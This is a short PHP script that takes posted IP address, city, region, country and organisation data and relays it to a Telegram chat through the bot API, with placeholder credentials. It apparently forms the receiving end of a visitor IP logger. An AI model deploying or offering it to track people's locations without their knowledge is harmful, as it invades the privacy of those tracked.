<?php
$input = json_decode(file_get_contents("php://input"), true);

$message = "IP: " . $input['ip'] . "\n" .
           "City: " . $input['city'] . "\n" .
           "Region: " . $input['region'] . "\n" .
           "Country: " . $input['country'] . "\n" .
           "Org: " . $input['org'];

$token = "<YOUR_TELEGRAM_BOT_TOKEN>";
$chat_id = "<YOUR_TELEGRAM_CHAT_ID>";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
?>
